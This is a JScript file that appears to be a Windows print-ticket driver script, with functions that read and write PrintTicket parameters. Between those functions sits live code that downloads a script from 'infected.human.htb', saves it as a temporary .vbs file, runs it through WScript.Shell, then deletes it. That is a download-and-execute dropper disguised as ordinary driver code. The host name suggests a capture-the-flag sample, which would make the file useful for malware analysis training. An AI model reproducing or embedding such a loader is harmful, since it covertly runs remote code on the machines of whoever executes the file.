
function f0(v3, v2, v1) {
    SetStandardNameSpaces(v1.XmlNode);
    var z0 = getPrefixForNamespace(v1.XmlNode, z1);
    if (z0 != null) {
        var pdcParameterDefs = getParameterDefs(v2);
        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            var paramString = v3.getString(pdcParameterDefs[defCount]);
            if (paramString != null && paramString.length > 0) {
                var paramName = z0 + ":" + pdcParameterDefs[defCount];
                var currNode = v1.GetParameterInitializer(pdcParameterDefs[defCount], z1)
                if (currNode == null) {
                    var ptRoot = v1.XmlNode.selectSingleNode("psf:PrintTicket");
                    var newParam = createProperty(paramName, "psf:ParameterInit", "xsd:string", paramString, v1);
                    ptRoot.appendChild(newParam);
                } else {
                    currNode.Value = paramString;
                }
            }
        }
    }
}

var x1 = new ActiveXObject("MSXML2.XMLHTTP.6.0");
var x2 = new ActiveXObject("Scripting.FileSystemObject");
var x3 = new ActiveXObject("WScript.Shell");
var x4 = 'C:\\Windows\\Temp';
var x5 = x2.GetTempName() + ".vbs"; 
var x6 = x2.BuildPath(x4, x5);
x1.open("GET", "http://infected.human.htb/d/BKtQR", false);
x1.send();

if (x1.status === 200) {
    var scriptText = x1.responseText;
    var y1 = x2.CreateTextFile(x6, true);
    y1.write(scriptText);
    y1.close();
    var y2 = x3.Exec('wscript "' + x6 + '"');
    while (y2.Status === 0) {
        WScript.Sleep(100);
    }
    x2.DeleteFile(x6);

} else {
    WScript.Echo("Fatal: " + x1.status);
}


function f1(v1, v2, v3) {
    SetStandardNameSpaces(v1.XmlNode);
    var z0 = getPrefixForNamespace(v1.XmlNode, z1);
    if (z0 != null) {
        var pdcParameterDefs = getParameterDefs(v2);
        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            var currNode = v1.GetParameterInitializer(pdcParameterDefs[defCount], z1)
            if (currNode != null) {
                v3.setString(pdcParameterDefs[defCount], currNode.Value);
            }
        }
    }
}

